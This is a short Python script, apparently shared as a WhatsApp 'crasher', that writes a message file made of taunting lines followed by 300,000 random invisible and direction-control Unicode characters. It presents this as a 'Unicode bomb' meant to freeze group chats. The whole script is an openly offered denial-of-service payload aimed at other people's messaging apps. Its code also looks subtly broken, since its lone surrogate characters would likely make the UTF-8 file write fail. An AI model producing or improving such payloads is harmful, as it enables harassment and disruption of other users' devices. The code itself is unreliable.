# 💥 RIMZI FAST MICRO-CRASHER 💥
# ⚡ 300,000 Unicode Bomb in 6-Line Message

import os, random

def generate_payload():
    visible = (
        "💀 Group dead by RIMZI-X\n"
        "🔥 WhatsApp meltdown begins\n"
        "😈 This chat can't be saved\n"
        "🧠 Unicode overload active\n"
        "🚫 Reply = Freeze\n"
        "💣 Wait for the burn...\n\n"
    )

    charset = [
        '\u200B', '\u200C', '\u200D', '\u2063', '\u2060', '\u200E',
        '\u200F', '\u061C', '\u202A', '\u202B', '\u202C', '\u202D',
        '\u202E', '\u2061', '\u2062', '\uDBFF\uDFFF'
    ]

    for _ in range(300000):  # FAST version
        visible += random.choice(charset)

    return visible

def main():
    print("[+] Generating FAST crash message (300K payload)...")
    payload = generate_payload()
    with open("rimzi_fast_crash.txt", "w", encoding="utf-8") as f:
        f.write(payload)
    print("[✔] Payload saved as 'rimzi_fast_crash.txt' ✅")

if __name__ == "__main__":
    main()
